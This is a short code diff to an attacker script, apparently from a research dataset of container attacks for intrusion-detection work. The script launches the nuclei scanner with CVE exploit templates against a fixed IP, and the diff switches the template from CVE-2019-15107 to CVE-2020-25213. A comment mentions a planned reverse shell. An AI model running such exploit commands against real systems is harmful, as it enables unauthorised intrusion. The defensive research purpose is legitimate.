@@ -14,7 +14,8 @@ class OSCI_CVE_2019_15107_Attacker2(AttackerBase):
 
     def main(self):
         print("Main method started")
-        self.commandRunner.runCommand('nuclei -u https://144.122.71.18:30003 -t /home/vagrant/A-NOVEL-CONTAINER-ATTACKS-DATASET-FOR-INTRUSION-DETECTION/Scripts/Scenario-I/OSCI_CVE_2019_15107/Attacker2/CVE-2019-15107_Payload.yaml -debug')
+        self.commandRunner.runCommand('nuclei -u https://144.122.71.18:30007 -t /home/vagrant/A-NOVEL-CONTAINER-ATTACKS-DATASET-FOR-INTRUSION-DETECTION/Scripts/Scenario-I/UUF_CVE_2020_25213/Attacker2/CVE_2020_25213_Payload.yaml -debug')
+
 
 
     # Reverse shell will be handled later...
